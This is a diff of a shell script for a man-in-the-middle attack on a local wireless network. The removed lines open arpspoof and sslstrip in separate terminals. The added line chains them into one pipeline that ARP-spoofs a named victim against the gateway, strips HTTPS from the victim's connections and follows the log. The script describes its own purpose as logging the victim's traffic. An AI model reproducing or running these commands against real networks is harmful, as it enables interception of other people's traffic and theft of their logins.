@@ -16,10 +16,5 @@ echo ".."
 sleep 5
 echo "..."
 sleep 5
-gnome-terminal -- "arpspoof -i wlan0 -t $VICTIM -r $DG"
-echo "Start sslstrip -l $REDIRECT on another terminal..."
-sleep 5
-gnome-terminal -- "sslstrip -l $REDIRECT"
-sleep 5
-echo "Starting log your VICTIM $VICTIM trafics"
+arpspoof -i wlan0 -t $VICTIM -r $DG > ./arpspoof.log | sslstrip -l $REDIRECT | tail -f sslstrip.log
 
